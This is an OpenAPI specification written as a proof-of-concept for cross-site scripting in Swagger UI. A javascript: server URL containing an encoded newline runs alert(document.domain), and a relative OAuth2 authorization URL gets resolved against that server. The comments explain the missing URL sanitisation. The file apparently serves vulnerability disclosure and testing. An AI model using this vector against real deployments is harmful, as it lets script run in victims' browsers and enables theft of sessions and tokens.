openapi: "3.0.3"
info:
  title: "XSS PoC - Swagger UI"
  version: "1.0.0"

# Malicious server URL - %0a is URL-encoded newline
# sanitizeUrl() is never called on this value
servers:
  - url: "javascript://%0aalert(document.domain)//"

paths:
  /users:
    get:
      operationId: getUsers
      security:
        - oauth2_poc: []
      responses:
        "200":
          description: OK

# OAuth2 scheme with relative authorizationUrl
# Relative URL gets resolved against the malicious server
components:
  securitySchemes:
    oauth2_poc:
      type: oauth2
      flows:
        implicit:
          authorizationUrl: "/oauth2/authorize"
          scopes:
            read: Read access
